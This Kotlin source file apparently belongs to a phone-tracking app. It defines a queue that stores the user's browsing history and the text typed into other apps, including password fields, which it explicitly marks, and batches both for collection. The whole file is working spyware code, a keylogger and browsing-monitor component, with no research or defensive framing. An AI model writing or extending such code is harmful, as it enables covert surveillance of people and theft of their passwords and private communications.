package com.takip.app.service

import org.json.JSONArray
import org.json.JSONObject
import java.util.Collections

object ActivityLogQueue {
    private val webHistory = Collections.synchronizedList(mutableListOf<JSONObject>())
    private val inputLogs = Collections.synchronizedList(mutableListOf<JSONObject>())

    fun addWebHistory(url: String, title: String?, browserPackage: String, browserName: String?) {
        if (url.isBlank() || url.length < 4) return
        webHistory.add(JSONObject().apply {
            put("url", url)
            put("title", title)
            put("browserPackage", browserPackage)
            put("browserName", browserName)
            put("timestamp", java.time.Instant.now().toString())
        })
    }

    fun addInputLog(
        appPackage: String,
        appName: String?,
        fieldName: String?,
        text: String,
        isPasswordField: Boolean
    ) {
        if (text.isBlank()) return
        inputLogs.add(JSONObject().apply {
            put("appPackage", appPackage)
            put("appName", appName)
            put("fieldName", fieldName)
            put("text", text)
            put("isPasswordField", isPasswordField)
            put("timestamp", java.time.Instant.now().toString())
        })
    }

    fun drainWebHistory(): JSONArray {
        val array = JSONArray()
        synchronized(webHistory) {
            webHistory.forEach { array.put(it) }
            webHistory.clear()
        }
        return array
    }

    fun drainInputLogs(): JSONArray {
        val array = JSONArray()
        synchronized(inputLogs) {
            inputLogs.forEach { array.put(it) }
            inputLogs.clear()
        }
        return array
    }
}
